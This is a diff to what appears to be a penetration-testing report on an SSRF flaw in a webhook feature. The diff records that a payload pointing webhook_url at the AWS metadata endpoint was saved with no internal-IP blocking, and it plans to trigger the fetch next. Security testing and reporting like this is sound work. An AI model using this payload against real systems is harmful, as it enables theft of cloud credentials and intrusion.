@@ -689,15 +689,42 @@ Now that SSRF is confirmed, the following tests determine the **severity and imp
 
 #### Test 1 — Can it reach AWS metadata? (Critical escalation)
 
-In Burp Repeater, resend the request with:
+**RESULT: PARTIALLY CONFIRMED**
+
+Request sent with `"webhook_url": "http://169.254.169.254/latest/meta-data/"`.
+
+Server response (200 OK):
 
 ```json
-"webhook_url": "http://169.254.169.254/latest/meta-data/"
+{
+  "info": "Save completed.",
+  "template": {
+    "webhook_url": "http://169.254.169.254/latest/meta-data/",
+    "webhook_method": "POST",
+    "webhook_headers": {},
+    "webhook_body_type": "json",
+    "webhook_body": "{}",
+    "webhook_is_kakao": false,
+    "id": "69c8ddca629242005dba88d8",
+    "name": "venu",
+    "description": null,
+    "api_identifier": "18895a36-80c0-48fa-957f-516a1af90b4b",
+    "tag_names": [],
+    "territory_ids": [],
+    "last_edited_at": 1774771658,
+    "marked_as_deleted": false,
+    "created_by": "69c8d258629242005dba8850",
+    "last_edited_by": "69c8d258629242005dba8850"
+  }
+}
 ```
 
-Then check:
-- Does the response contain metadata content? (full SSRF)
-- Does Collaborator show the request was attempted? (use a redirect chain if needed)
+**Observations:**
+- The server **accepted and stored** `http://169.254.169.254/latest/meta-data/` without blocking it.
+- **No internal IP blocklist** is enforced at the save/validation level.
+- The save operation does not trigger the outbound request — a separate test/trigger action is needed.
+- Template ID obtained: `69c8ddca629242005dba88d8`.
+- **Next:** Trigger the webhook via test endpoint to see if the server actually fetches metadata content.
 
 If IMDSv2 is enforced, try:
 
